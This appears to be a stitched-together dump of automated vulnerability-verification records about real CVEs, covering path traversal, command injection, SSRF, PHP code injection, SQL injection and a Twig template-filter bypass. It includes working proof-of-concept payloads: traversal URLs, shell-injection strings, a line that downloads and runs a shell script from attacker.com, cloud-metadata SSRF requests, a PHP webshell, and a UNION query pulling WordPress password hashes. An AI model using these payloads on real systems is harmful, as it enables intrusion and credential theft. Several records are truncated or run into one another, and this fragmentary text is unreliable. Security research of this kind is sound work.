Impact: 攻击者可以读取服务器文件系统中的任意文件，包括敏感文件如 /etc/passwd、配置文件、源代码等。当服务器以高权限运行时，影响更为严重。

Nodes.Desc: 源点：通过 `cwd()` 读取外部输入，污点从此进入。代码: `dir: process.cwd(),`
传播点：`this` 经 `normalize()` 处理后并入 `dir`，污点继续向下游传播。 代码: `this.dir = path.normalize(options.dir)`
传播点：`request` 经 `join()` 处理后并入 `fullPath`，污点继续向下游传播。 代码: `request.fullPath = path.join( self.dir, decodeURIComponent(parse(req.url).pathname) )`
传播点：数据在 `slice()` 调用链中继续传递/变换。代码: `if (request.fullPath.slice(0, self.dir.length) !== self.dir) { return self.emit('error', 403, request, res) }`
汇点：调用 `stat(request)` 触发危险操作，污点在此触达危险 API。代码: `fs.stat(request.fullPath, statFile)`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 确认文件 index.js 存在且包含漏洞代码
2. 分析默认配置：dir 默认为 process.cwd()（相对路径）
3. 分析路径拼接逻辑：request.fullPath = path.join(self.dir, decodeURIComponent(parse(req.url).pathname))
4. 分析安全检查逻辑：if (request.fullPath.slice(0, self.dir.length) !== self.dir)
5. 发现漏洞：当 self.dir 为相对路径（如 '.'）时，用户输入 '../../../etc/passwd' 会通过检查，因为 '../../etc/passwd'.slice(0,1) === '.'
6. 确认文件访问：fs.stat(request.fullPath, statFile) 会访问遍历后的路径
evidence.method: 代码静态分析结合配置分析。通过分析默认配置（lib/config.js）和路径处理逻辑，确认当 dir 为相对路径时，安全检查无法防止目录遍历。

poc.description: 当 glance 使用默认配置（或任何相对路径作为目录）运行时，攻击者可以通过目录遍历序列访问上级目录的文件
steps: 1. 启动 glance 服务器：glance（默认使用当前目录）
2. 访问 URL：http://localhost:8080/../../../etc/passwd
3. 服务器将返回 /etc/passwd 文件内容

cve_info.Description: Versions of the package glance before 3.0.9 are vulnerable to Directory Traversal that allows users to read files outside the public root directory. This is related to but distinct from the vulnerability reported in [CVE-2018-3715](https://security.snyk.io/vuln/npm:glance:20180129).

basic_info.title: CVE-2022-25926: window-control包sendKeys函数命令注入漏洞
basic_info.description:
window-control包1.4.5之前版本中的sendKeys函数存在命令注入漏洞。keys参数仅使用简单的replace('"', '\"')进行清理，这不足以防止命令注入。攻击者可以通过注入特殊字符（如分号、反引号、管道符等）在三个平台（macOS、Windows、Linux）上执行任意命令。该漏洞对应CVE-2022-25926，已在1.4.5版本中修复。

Impact: 攻击者可以通过控制id或keys参数在目标系统上执行任意命令，可能导致：1. 系统完全被控制；2. 敏感信息泄露（如/etc/passwd）；3. 安装恶意软件；4. 发起进一步攻击

findings.title: CVE-2022-25926: window-control包sendKeys函数命令注入漏洞
findings.description:
window-control包1.4.5之前版本中的sendKeys函数存在命令注入漏洞。keys参数仅使用简单的replace('"', '\"')进行清理，这不足以防止命令注入。攻击者可以通过注入特殊字符（如分号、反引号、管道符等）在三个平台（macOS、Windows、Linux）上执行任意命令。该漏洞对应CVE-2022-25926，已在1.4.5版本中修复。

Impact: 攻击者可以通过控制id或keys参数在目标系统上执行任意命令，可能导致：1. 系统完全被控制；2. 敏感信息泄露（如/etc/passwd）；3. 安装恶意软件；4. 发起进一步攻击

Nodes.Desc: 源点：变量 `sendKeys` 在此接收可控数据并进入污点传播链。代码: `const sendKeys = (id, keys, {resetFocus = false, pressEnterOnceDone = true} = {}) => {`
Nodes.code: const sendKeys = (id, keys, {resetFocus = false, pressEnterOnceDone = true} = {}) => {

Nodes.Desc: 传播点：`replace` 经 `replace()` 处理后并入 `keys`，污点继续向下游传播。 代码: `keys = keys.replace('"', '\\"')`
汇点：调用 `exec(osascript)` 触发命令/SQL 执行，污点在此触达危险 API。代码: `exec(`osascript "${macFocusAndSendKeys}" ${id} "${keys}" ${resetFocus} ${pressEnterOnceDone}`, (error, stdout, stderr) =...`
汇点：调用 `exec(winSendKeysToWindowName)` 触发命令/SQL 执行，污点在此触达危险 API。代码: `exec(`${winSendKeysToWindowName} "${windowTitle}" "${keys}"`, (error, stdout, stderr) => {`
汇点：调用 `exec(sendTextToWindowWithId)` 触发命令/SQL 执行，污点在此触达危险 API。代码: `exec(`${sendTextToWindowWithId} ${windowID} "${keys}"`, (error, stdout, stderr) => {`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 1. 确认文件index.js存在且包含sendKeys函数；2. 代码分析显示keys参数仅使用replace('"', '\"')进行不充分的转义（只替换第一个双引号）；3. id参数在macOS和Linux平台直接拼接到exec命令中，没有引号包裹；4. Windows平台id参数在引号内，但keys转义不足；5. package.json显示版本为1.4.4，匹配CVE-2022-25926影响范围（<1.4.5）；6. 数据流分析确认id和keys参数没有净化直接流向exec函数
evidence.method: 静态代码分析 + 数据流分析 + CVE版本匹配

poc.description: 攻击者可以通过控制id或keys参数执行任意命令
steps: 1. 在macOS平台调用sendKeys('123; id', 'hello')
2. 函数构造命令：osascript "/path/to/script" 123; id "hello" false true
3. 分号分隔命令，执行'id'命令显示当前用户
4. 在Linux平台调用sendKeys('123; cat /etc/passwd', 'hello')
5. 函数构造命令：sendTextToWindowWithId.sh 123; cat /etc/passwd "hello"
6. 执行cat /etc/passwd泄露系统用户信息

cve_info.Description: Versions of the package window-control before 1.4.5 are vulnerable to Command Injection via the sendKeys function, due to improper input sanitization.

CWE.Description: Command Injection

PatchInfo.Message: fix: add sanitisation to user input

basic_info.title: Command Injection in index.js
basic_info.description:
The module exports an async function that takes 'bin' parameter and directly concatenates it into a command string at line 5: `${process.cwd()}/node_modules/.bin/${bin}`. This unsanitized user input is then passed to child_process.exec(), allowing command injection.

Impact: 攻击者可以通过控制bin参数执行任意系统命令，可能导致：1) 服务器完全被控制（执行反弹shell），2) 敏感数据泄露（读取/etc/passwd、环境变量等），3) 文件系统破坏（rm -rf /），4) 内网横向移动，5) 挖矿等恶意活动。由于这是一个npm模块，影响所有使用该模块的应用程序。

findings.title: Command Injection in index.js

Nodes.Desc: 源点：变量 `exports` 通过 `function()` 接收外部输入并成为污点源。代码: `module.exports = async function (bin, options) {`
传播点：`const` 经 `cwd()` 处理后并入 `cmd`，污点继续向下游传播。 代码: `const cmd = `${process.cwd()}/node_modules/.bin/${bin}`;`
汇点：调用 `exec(cmd)` 触发命令/SQL 执行，污点参数被消费（结果写入 `theProcess`）。 代码: `const theProcess = exec(cmd, options, (error, stdout, stderr) => {`
Nodes.code: const theProcess = exec(cmd, options, (error, stdout, stderr) => {

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: Created a Node.js Fuzzing Harness that mocks child_process.exec to detect command execution. Tested 10 payloads including command separators (;, &&, ||, |), command substitution ($(), ``), and path traversal. 8 out of 10 payloads successfully triggered command injection, confirming the vulnerability. The bin parameter is directly concatenated into the command string without sanitization, allowing attackers to inject arbitrary commands.
evidence.method: Dynamic testing with Fuzzing Harness - created mock exec function to detect command execution and tested multiple payloads

Call the exported function with malicious bin parameter containing command separator
Observe that arbitrary commands are executed

basic_info.title: Command Injection in index.js
basic_info.description:
The wiscan.scan function in index.js line 22 concatenates user-controlled intf parameter directly into shell command without proper sanitization, allowing command injection. Attackers can inject arbitrary shell commands

Impact: Remote attackers can execute arbitrary shell commands on the system with the privileges of the Node.js process. This can lead to complete system compromise, data theft, or service disruption.

basic_info.title: Xss in patientdata.js
basic_info.description:
In portal/patient/scripts/app/patientdata.js line 131, the key and value variables from page.portalpatient.attributes are concatenated directly into an HTML string for an <a> tag's onclick attribute and content without proper escaping.

Kanban is a GLPI view to display Projects, Tickets, Changes or Problems on a task board. In versions prior to 10.0.1 a user can exploit a cross site scripting vulnerability in Kanban by injecting HTML code in its user name. Users are advised to upgrade. There are no known workarounds for this issue.

basic_info.title: Command Injection in fileupload.ccc
basic_info.description:
The fileupload.ccc CGI script contains a command injection vulnerability where `eval $(echo ${QUERY_STRING//&/;})` is used to parse query string parameters. The QUERY_STRING environment variable, containing HTTP request parameters, is directly executed via eval after replacing & with ;, allowing command injection.

Impact: 攻击者可以通过构造恶意HTTP请求执行任意系统命令，包括：1. 读取敏感文件（/etc/passwd, 配置文件等）。2. 执行系统命令（删除文件、创建用户等）。3. 反弹shell获取服务器控制权。4. 在系统上安装恶意软件或后门。由于这是一个Web可访问的CGI脚本，漏洞可被远程利用。

evidence.analysis: 1. 读取文件buildroot-external/patches/occu/0031-WebUI-Fix-FileUpload/occu/WebUI/www/config/fileupload.ccc确认文件存在且包含漏洞代码。2. 分析第22-24行代码：eval $(echo ${QUERY_STRING//&/;})。3. 确认QUERY_STRING是CGI环境变量，包含用户可控的HTTP查询参数。4. 确认${QUERY_STRING//&/;}将&替换为;（shell命令分隔符）。5. 确认eval直接执行处理后的字符串，无任何过滤或验证。6. 查看脚本后续代码（第43-54行）确认提取的变量（url, sid, downloadOnly, action, filename）被用于生成JavaScript输出。
evidence.method: 静态代码分析结合数据流追踪。通过read_file读取完整文件内容，分析QUERY_STRING环境变量从输入到eval执行的完整路径，确认无任何过滤或验证机制。

#!/bin/bash
# 理论验证脚本 - 展示漏洞原理
# 由于环境限制无法实际执行，但展示了攻击向量

echo "=== Command Injection PoC ==="
echo ""
echo "正常请求:"
echo "QUERY_STRING='filename=test.txt&action=upload'"
echo "执行: eval \$(echo \${QUERY_STRING//&/;})"
echo "结果: 设置变量 filename=test.txt 和 action=upload"
echo ""
echo "恶意请求:"
echo "QUERY_STRING='filename=test.txt&id&action=upload'"
echo "替换后: filename=test.txt;id;action=upload"
echo "执行: eval \$(echo filename=test.txt;id;action=upload)"
echo "结果: 1. 设置变量 filename=test.txt"
echo "       2. 执行命令 id (显示用户ID)"
echo "       3. 设置变量 action=upload"
echo ""
echo "更危险的payload:"
echo "QUERY_STRING='filename=test.txt&wget http://attacker.com/shell.sh -O /tmp/shell.sh&chmod +x /tmp/shell.sh&/tmp/shell.sh&action=upload'"
echo "这将下载并执行远程shell脚本"

cve_info.Title: Remote Command Injection in RaspberryMatic
cve_info.Description: RaspberryMatic is a free and open-source operating system for running a cloud-free smart-home using the homematicIP / HomeMatic hardware line of IoT devices. A Remote Code Execution (RCE) vulnerability in the file upload facility of the WebUI interface of RaspberryMatic exists. Missing input validation/sanitization in the file upload mechanism allows remote, unauthenticated attackers with network access to the WebUI interface to achieve arbitrary operating system command execution via shell metacharacters in the HTTP query string. Injected commands are executed as root, thus leading to a full compromise of the underlying system and all its components. Versions after `2.31.25.20180428` and prior to `3.63.8.20220330` are affected. Users are advised to update to version `3.63.8.20220330` or newer. There are currently no known workarounds to mitigate the security impact and users are advised to update to the latest version available.

CWE.Description: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

PatchInfo.Message:
reworked fileupload.ccc in 0031-WebUI-Fix-FileUpload WebUI patch to
contain several security checks for a valid admin session id and
query string checks as well as omitting the critical use of "eval"
to parse the URL query string altogether. This should significantly
improve the security burden, thus fix a security issue raised by @qx-f7

basic_info.title: Protocol Validation Bypass in URI.js
basic_info.description:
URI.js version before 1.19.9 contains a vulnerability in the protocol parsing logic where URLs with leading whitespace (e.g., ' http://example.com') are not properly handled. The regular expression at line 516 `/^(https?|ftp|wss?)?:[\/\\]*/i` uses `^` to match from the start of the string, so leading whitespace prevents the match. This causes the extracted protocol to contain whitespace (e.g., ' http'), which fails to match `URI.protocol_expression` (`/^[a-z][a-z0-9.+-]*$/i`), resulting in `parts.protocol` being set to `undefined`. When `URI.ensureValidHostname` is called with `protocol` as `undefined`, the empty hostname check for HTTP/HTTPS protocols is bypassed.

Impact: 攻击者可以通过在URL前添加空格来绕过协议验证，创建没有主机名的HTTP/HTTPS URL。这可能被用于：
1. 构造异常的URL，绕过某些基于协议的安全检查
2. 在某些使用URI.js进行URL验证的应用程序中，可能导致验证逻辑被绕过
3. 可能与其他漏洞结合，增强攻击效果
实际影响取决于应用程序如何使用URI.js以及是否依赖协议验证进行安全检查。

findings.title: Protocol Validation Bypass in URI.js
findings.description:
URI.js version before 1.19.9 contains a vulnerability in the protocol parsing logic where URLs with leading whitespace (e.g., ' http://example.com') are not properly handled. The regular expression at line 516 `/^(https?|ftp|wss?)?:[\/\\]*/i` uses `^` to match from the start of the string, so leading whitespace prevents the match. This causes the extracted protocol to contain whitespace (e.g., ' http'), which fails to match `URI.protocol_expression` (`/^[a-z][a-z0-9.+-]*$/i`), resulting in `parts.protocol` being set to `undefined`. When `URI.ensureValidHostname` is called with `protocol` as `undefined`, the empty hostname check for HTTP/HTTPS protocols is bypassed.

Impact: 攻击者可以通过在URL前添加空格来绕过协议验证，创建没有主机名的HTTP/HTTPS URL。这可能被用于：

实际影响取决于应用程序如何使用URI.js以及是否依赖协议验证进行安全检查。

传播点：`slashes` 经 `replace()` 处理后并入 `string`，污点继续向下游传播。 代码: `// slashes and backslashes have lost all meaning for the web protocols (https, http, wss, ws) string = string.replace(/^...`
Nodes.code:
// slashes and backslashes have lost all meaning for the web protocols (https, http, wss, ws)
    string = string.replace(/^(https?|ftp|wss?)?:[/\\]*/i, '$1://');

汇点：调用 `function(v)` 触发危险操作，污点参数被消费（结果写入 `hasHostname`）。 代码: `URI.ensureValidHostname = function(v, protocol) { // Theoretically URIs allow percent-encoding in Hostnames (according t...`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 读取并分析了src/URI.js文件中的URI.parse函数（第490-550行）。
2. 确认了第516行的正则表达式/^(https?|ftp|wss?)?:[\/\\]*/i使用^匹配字符串开头，前导空格会导致匹配失败。
3. 分析了第527-532行的协议提取逻辑：当协议包含空格（如' http'）时，不匹配URI.protocol_expression（/^[a-z][a-z0-9.+-]*$/i），导致parts.protocol被设置为undefined。
4. 检查了URI.ensureValidHostname函数（第1078-1101行）：当protocol为undefined时，hasProtocol为false，rejectEmptyHostname为false，空主机名检查被绕过。
5. 确认了URI.hostProtocols包含['http', 'https']（第253-256行），这些协议通常需要主机名。
6. 验证了package.json中的版本为1.19.8，在CVE-2022-24723影响的版本范围内（1.19.9之前）。
evidence.method: 静态代码分析结合CVE描述验证。通过分析URI.parse函数（第490行）的逻辑，确认了当URL包含前导空格时，第516行的正则表达式不匹配，导致协议提取异常。进一步追踪到URI.ensureValidHostname函数（第1078行），发现当protocol为undefined时，HTTP/HTTPS协议的空主机名检查被绕过。

4. parts.protocol被设置为undefined

cve_info.Title: Improper Input Validation in URI.js
cve_info.Description: URI.js is a Javascript URL mutation library. Before version 1.19.9, whitespace characters are not removed from the beginning of the protocol, so URLs are not parsed properly. This issue has been patched in version 1.19.9. Removing leading whitespace from values before passing them to URI.parse can be used as a workaround.

CWE.Description: CWE-20: Improper Input Validation

PatchInfo.Message:
fix(parse): remove leading whitespace

reported by @p0cas via huntr.dev

basic_info.title: Ssrf in editor.php
basic_info.description:
The oEmbedProxy function in admin/controller/editor/editor.php directly passes user-controlled 'url' parameter to getUrl() function without validation. getUrl() uses curl_init() or file_get_contents() to fetch the URL, allowing Server-Side Request Forgery (SSRF) attacks.

Impact: 攻击者可利用此漏洞访问内部网络资源，包括：1. AWS/Azure元数据服务获取云凭证。2. 内部管理界面和服务。3. 本地文件系统（通过file://协议）。4. 端口扫描内部网络。可能导致敏感信息泄露、内部服务攻击、权限提升。

传播点：`$url` 经 `getUrl()` 处理后并入 `$result`，污点继续向下游传播。 代码: `$result = getUrl($url, false);`
汇点：调用 `getUrl($url)` 触发危险操作，污点参数被消费（结果写入 `$cache`）。 代码: `function getUrl($url, $cache = true, $expire = 604800, $timeout = 5, $exception = true) { $cacheDriver = System\Cache ::...`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 1. 读取admin/controller/editor/editor.php文件确认oEmbedProxy函数从$this->request->get['url']获取用户输入。2. 读取system/functions.php文件确认getUrl函数使用curl_init()和file_get_contents()进行HTTP请求。3. 编写PHP测试脚本模拟攻击，测试了多个SSRF payload（169.254.169.254、127.0.0.1、file://协议等）。4. 确认代码中没有URL验证、白名单或过滤机制，攻击者可控制完整URL访问内部资源。
evidence.method: 代码静态分析结合动态测试：提取oEmbedProxy函数和getUrl函数，编写PHP测试脚本模拟SSRF攻击，验证用户控制的URL参数可直接传递给HTTP请求函数。

poc.description: 通过oEmbedProxy功能发送恶意URL参数访问内部服务
steps: 访问oEmbedProxy端点：/admin/index.php?route=editor/editor/oEmbedProxy
添加url参数指向内部资源：?url=http://169.254.169.254/latest/meta-data/
服务器将代表攻击者请求内部元数据服务并返回结果

GET /admin/index.php?route=editor/editor/oEmbedProxy&url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com

或使用curl测试：
curl 'http://target.com/admin/index.php?route=editor/editor/oEmbedProxy&url=http://127.0.0.1:22/'
poc.harness_code:
<?php
// SSRF测试脚本
function getUrl($url, $cache = true, $expire = 604800, $timeout = 5, $exception = true) {
    echo "[DEBUG] Fetching URL: $url\n";
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } else {
        return file_get_contents($url);
    }
}

// 模拟oEmbedProxy
$_GET['url'] = 'http://169.254.169.254/latest/meta-data/';
$url = $_GET['url'];
$result = getUrl($url, false);
echo "SSRF Result: " . substr($result, 0, 100) . "...\n";
?>

basic_info.title: Code Injection in code.php

admin/controller/editor/code.php 中的 save() 函数缺少文件扩展名验证，攻击者可以通过控制 'file' 参数指定 .php 扩展名文件，并通过 'content' 参数写入任意PHP代码。当该文件被访问时，代码将被执行，导致远程代码执行。补丁信息显示修复添加了 $saveDenyExtensions 数组和扩展名检查，证实了此漏洞的存在。

Impact: 高危 - 远程代码执行。攻击者可以写入PHP webshell，完全控制服务器。可以执行任意系统命令、读取敏感文件、植入后门等。

poc.harness_code:
<?php
// 模拟save()函数漏洞验证
function sanitizeFileNameClass($file, $type) {
    $file = preg_replace("@^[\/]public@", '', $file);
    if ($type == 'plugins') {
        $file = '/plugins/' . preg_replace("@^[\/]plugins[\/]@", '', $file);
    } else if ($type == 'themes') {
        $file = '/themes/' . preg_replace("@^[\/]themes[\/]@", '', $file);
    } else {
        $file = '/public/' . $file;
    }
    return $file;
}

// 测试写入PHP文件
$type = 'public';
$file = 'shell.php';
$content = '<?php system($_GET[\'cmd\']); ?>';
$processedFile = sanitizeFileNameClass($file, $type);
echo "[VULN] Would write to: $processedFile\n";
echo "[VULN] Content: $content\n";
echo "[VULN] PHP file extension allowed! Remote code execution possible.\n";
?>

poc.description: 通过 WordPress REST API 端点进行 SQL 注入攻击
steps: 1. 目标 WordPress 站点需安装并激活 JQ Archive List Widget 插件
2. 发送 GET 请求到 REST API 端点 /wp-json/jalw/v1/archive/2023/12/
3. 添加恶意参数 cats=1) OR 1=1-- 或 onlycats=1) UNION SELECT user_login,user_pass FROM wp_users--
4. 观察响应，确认 SQL 注入成功（可能返回异常或额外数据）

GET /wp-json/jalw/v1/archive/2023/12/?exclusionType=include&cats=1) OR 1=1--&type=post HTTP/1.1
Host: vulnerable-wordpress-site.com

或

GET /wp-json/jalw/v1/archive/2023/12/?onlycats=1) UNION SELECT user_login,user_pass FROM wp_users--&type=post HTTP/1.1

poc.harness_code:
<?php
// 简化版漏洞验证代码
$wpdb = new stdClass();
$wpdb->term_taxonomy = 'wp_term_taxonomy';

class TestDataSource {
    public $config = [];
    public function __construct($config) { $this->config = $config; }
    private function only_show_cur_category() { return !empty($this->config['onlycategory']); }
    private function has_filtering_categories() { return false; }
    
    public function build_sql_where($year, $month) {
        global $wpdb;
        $where = sprintf("WHERE post_type = '%s' AND post_status = 'publish' ", $this->config['type'] ?? 'post');
        if ($year) $where .= sprintf('AND YEAR(post_date) = %s ', $year);
        if ($month) $where .= sprintf('AND MONTH(post_date) = %s ', $month);
        if (!empty($this->config['included'])) {
            $ids = is_array($this->config['included']) ? implode(',', $this->config['included']) : $this->config['included'];
            $where .= sprintf('AND %s.term_id IN (%s)', $wpdb->term_taxonomy, $ids);
        }
        if ($this->only_show_cur_category()) {
            $where .= sprintf('AND %s.term_id IN (%s) ', $wpdb->term_taxonomy, $this->config['onlycategory']);
        }
        return $where;
    }
}

// 测试 SQL 注入
$config = ['type' => 'post', 'included' => "1) OR 1=1--"];
$ds = new TestDataSource($config);
echo $ds->build_sql_where('2023', '12');
// 输出: WHERE post_type = 'post' AND post_status = 'publish' AND YEAR(post_date) = 2023 AND MONTH(post_date) = 12 AND wp_term_taxonomy.term_id IN (1) OR 1=1--)
?>

cve_info.Title: JS Archive List <= 6.1.5 - Unauthenticated SQL Injection via build_sql_where Function
cve_info.Description: The JS Archive List plugin for WordPress is vulnerable to time-based SQL Injection via the build_sql_where() function in all versions up to, and including, 6.1.5 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

CWE.Description: CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

PatchInfo.Message: chore: update version to 6.1.6 and improve code efficiency

汇点：调用 `baseurl(lhcphpresque)` 触发危险操作，污点参数被消费（结果写入 `action`）。 代码: `<form action="<?php echo erLhcoreClassDesign::baseurl('lhcphpresque/list')?>/<?php echo $list?>/" method="post">`

evidence.method: Fuzzing Harness模拟测试，构建PHP测试脚本模拟模板渲染过程，验证用户输入是否未经编码直接输出到HTML属性中。

cve_info.Title: LiveHelperChat lhc-php-resque Extension List list cross site scripting
cve_info.Description: A vulnerability was found in LiveHelperChat lhc-php-resque Extension up to ee1270b35625f552425e32a6a3061cd54b5085c4. It has been classified as problematic. This affects an unknown part of the file /site_admin/lhcphpresque/list/ of the component List Handler. The manipulation of the argument queue name leads to cross site scripting. basic_info.title: Sql Injection in cp-admin-int-message-list.inc.php
basic_info.description:
在 cp-admin-int-message-list.inc.php 中，$_GET['lu'] 参数未经过滤直接拼接进SQL UPDATE查询，导致SQL注入漏洞。攻击者可以通过控制 'lu' GET参数注入恶意SQL代码。补丁显示添加了 intval() 过滤来修复此漏洞。

Impact: 攻击者可以通过lu参数注入任意SQL代码，可能导致：1. 读取、修改或删除数据库记录。2. 执行管理操作如删除表。3. 在WordPress上下文中，可能影响其他插件表。4. 如果数据库用户权限足够，可能执行系统命令或访问服务器文件。

basic_info.title: Code Injection in Twig.php
basic_info.description:
Security::cleanDangerousTwig 方法使用弱正则表达式过滤危险 Twig 函数，可能被绕过导致服务器端模板注入（SSTI）。方法中的正则表达式使用 `[^}]*?` 匹配非 `}` 字符，但 `}` 可以出现在字符串字面量或注释中，从而绕过检测。攻击者可以通过编辑页面内容（如果有权限）或控制传递给 processString 方法的字符串，注入恶意 Twig 代码，利用危险函数如 twig_array_map、call_user_func 等执行任意代码。

Impact: 攻击者若能控制传递给 processString 或 processPage 的内容（如通过页面编辑权限），可绕过 cleanDangerousTwig 过滤，注入并执行危险 Twig 函数。危险函数如 twig_array_map、call_user_func 等可能被利用来执行任意 PHP 代码，导致服务器端模板注入（SSTI），进而可能实现远程代码执行（RCE）、信息泄露或服务器接管。

findings.title: Code Injection in Twig.php
findings.description:
Security::cleanDangerousTwig 方法使用弱正则表达式过滤危险 Twig 函数，可能被绕过导致服务器端模板注入（SSTI）。方法中的正则表达式使用 `[^}]*?` 匹配非 `}` 字符，但 `}` 可以出现在字符串字面量或注释中，从而绕过检测。攻击者可以通过编辑页面内容（如果有权限）或控制传递给 processString 方法的字符串，注入恶意 Twig 代码，利用危险函数如 twig_array_map、call_user_func 等执行任意代码。

Impact: 攻击者若能控制传递给 processString 或 processPage 的内容（如通过页面编辑权限），可绕过 cleanDangerousTwig 过滤，注入并执行危险 Twig 函数。危险函数如 twig_array_map、call_user_func 等可能被利用来执行任意 PHP 代码，导致服务器端模板注入（SSTI），进而可能实现远程代码执行（RCE）、信息泄露或服务器接管。

Nodes.Desc: 源点：通过 `content()` 读取外部输入，污点从此进入。代码: `$content ??= $item->content();`
传播点：`content` 经 `cleanDangerousTwig()` 处理后并入 `$content`，污点继续向下游传播。 代码: `$content = Security::cleanDangerousTwig($content);`
传播点：`$bad_twig` 经 `preg_replace()` 处理后并入 `$string`，污点继续向下游传播。 代码: `public static function cleanDangerousTwig(string $string): string { if ($string === '') { return $string; } $bad_twig = ...`
汇点：调用 `render($template)` 触发模板/内容渲染，污点参数被消费（结果写入 `$output`）。 代码: `$output = $content = $local_twig->render($template, $twig_vars);`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 确认文件 system/src/Grav/Common/Twig/Twig.php 和 system/src/Grav/Common/Security.php 存在。
2. 分析 cleanDangerousTwig 方法中的正则表达式：第一个正则表达式使用 [^}]*? 匹配非 } 字符，当 } 出现在字符串字面量（如 '{{ "}" ~ twig_array_map() ~ "{" }}'）或注释中时，匹配会提前停止，无法检测到整个 Twig 标签中的危险函数。
3. 第二个正则表达式 /\b函数名(\s*\([^)]*\))?\b/i 存在 \b 位置错误和替换模式使用 $1 而非 $0 的问题，导致过滤不完整。
4. 通过 PHP 测试验证绕过：字符串连接 '{{ "}" ~ "twig" ~ "_array_map"() ~ "{" }}' 完全不被过滤，因为 'twig' ~ '_array_map' 不是直接的 twig_array_map，且 } 在字符串中阻止第一个正则表达式匹配。
5. 验证 processString 方法（第416行）和 processPage 方法（第342行）都调用 cleanDangerousTwig 过滤用户输入，但过滤可被绕过。
evidence.method: 代码静态分析结合动态测试验证。通过编写测试代码模拟 cleanDangerousTwig 方法的过滤逻辑，验证正则表达式缺陷和绕过可能性。

poc.description: 通过字符串连接绕过 cleanDangerousTwig 过滤，执行危险 Twig 函数
steps: 1. 构造恶意 Twig 代码：'{{ "}" ~ "twig" ~ "_array_map"() ~ "{" }}'
2. 将代码传递给 Grav 的 processString 方法或作为页面内容
3. cleanDangerousTwig 过滤失败，因为 } 在字符串字面量中阻止第一个正则表达式匹配，且字符串连接 'twig' ~ '_array_map' 不被第二个正则表达式识别
4. Twig 引擎渲染代码，执行 twig_array_map 函数
poc.harness_code:
<?php
// 模拟 cleanDangerousTwig 方法验证绕过
function cleanDangerousTwig(string $string): string {
    if ($string === '') return $string;
    $bad_twig = ['twig_array_map', 'twig_array_filter', 'call_user_func'];
    $string = preg_replace('/(({{\s*|{%\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\s*}}|\s*%}))/i', '{# $1 #}', $string);
    foreach ($bad_twig as $func) {
        $string = preg_replace('/\b' . preg_quote($func, '/') . '(\s*\([^)]*\))?\b/i', '{# $1 #}', $string);
    }
    return $string;
}

$payload = '{{ "}" ~ "twig" ~ "_array_map"() ~ "{" }}';
echo "Payload: " . $payload . "\n";
echo "Filtered: " . cleanDangerousTwig($payload) . "\n";
if (cleanDangerousTwig($payload) === $payload) {
    echo "✅ BYPASS SUCCESSFUL - Payload not filtered\n";
}
?>

cve_info.Title: Grav is vulnerable to RCE via SSTI through Twig Sandbox Bypass
cve_info.Description: Grav is a file-based Web platform. Prior to 1.8.0-beta.27, a Server-Side Template Injection (SSTI) vulnerability exists in Grav that allows authenticated attackers with editor permissions to execute arbitrary commands on the server and, under certain conditions, may also be exploited by unauthenticated attackers. This vulnerability stems from weak regex validation in the cleanDangerousTwig method. This vulnerability is fixed in 1.8.0-beta.27.

CWE.Description: CWE-94: Improper Control of Generation of Code ('Code Injection')
CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

PatchInfo.Message: Merge branch 'fix/GHSA-662m-56v4-3r8f-GHSA-858q-77wx-hhx6-GHSA-8535-hvm8-2hmv-GHSA-gjc5-8cfh-653x-GHSA-52hh-vxfw-p6rg-ssti-sandbox' into 1.8

basic_info.title: Sql Injection in agenda_admin_cad.php
basic_info.description:
The GET parameter 'cod_agenda' is directly assigned to $this->cod_agenda without type casting or sanitization (line 33), and then concatenated into SQL queries at multiple locations (lines 35, 43, 47, 49, 51, 98). This allows SQL injection attacks.

Impact: 攻击者可以通过cod_agenda参数执行任意SQL查询，可能导致：1) 数据泄露（读取敏感数据）；2) 数据篡改（修改/删除数据）；3) 数据库结构破坏（删除表）；4) 可能的权限提升。

cve_info.Title: i-Educar Authenticated Time-based SQL Injection in `agenda_admin_cad.php`
cve_info.Description: i-Educar is free, fully online school management software. In versions 2.10.0 and prior, an authenticated time-based SQL injection vulnerability exists in the ieducar/intranet/agenda_admin_cad.php script. An attacker with access to an authenticated session can execute arbitrary SQL commands against the application's database. This vulnerability is caused by the improper handling of the cod_agenda GET parameter, which is directly concatenated into an SQL query without proper sanitization. This issue has been patched in commit 3e9763a.

CWE.Description: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

PatchInfo.Message:
Merge commit from fork

fix: sanitize cod_agenda parameter to prevent SQL Injection

basic_info.title: Sql Injection in funcionario_vinculo_cad.php
basic_info.description:
The file ieducar/intranet/funcionario_vinculo_cad.php contains multiple SQL injection vulnerabilities. The primary vulnerability is at line 24-26 where $_GET['cod_funcionario_vinculo'] is directly assigned to $this->cod_vinculo and then concatenated into SQL queries without parameterization.

Impact: Critical - Attackers can execute arbitrary SQL commands including: 1) Read sensitive data from database, 2) Modify or delete data, 3) Execute administrative operations, 4) Potentially achieve remote code execution depending on database configuration and permissions

evidence.analysis: Created a mock clsBanco class to intercept SQL queries and tested multiple SQL injection payloads. All payloads were directly concatenated into SQL queries without any sanitization or parameterization. The Fuzzing Harness successfully detected SQL injection patterns including: 1' OR '1'='1, UNION-based injection, destructive DROP TABLE commands, and time-based injection patterns.
evidence.method: Dynamic testing with PHP Fuzzing Harness that simulated the vulnerable functions and detected SQL injection patterns in generated queries

